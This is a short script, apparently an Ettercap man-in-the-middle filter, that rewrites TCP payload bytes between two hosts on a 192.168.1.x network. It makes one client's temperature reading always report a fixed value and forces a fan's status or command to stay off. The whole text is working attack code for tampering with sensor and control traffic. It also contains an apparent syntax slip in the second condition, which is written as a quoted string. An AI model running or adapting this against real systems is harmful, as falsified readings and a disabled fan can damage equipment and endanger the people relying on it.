if (ip.proto == TCP) {	
	#When the Client sends the temperature value it sends the same value
	if(ip.src == '192.168.1.2' ){
			if (DATA.data + 8 == 0x06) {
				DATA.data + 12 = 0x49;
			}
	}
	#When the client requests the status of the fan never turn it on
	if('ip.src == 192.168.1.3') {
			if (DATA.data + 8 == 0x01) {
				DATA.data + 12 = 0x00;
			}
	}
}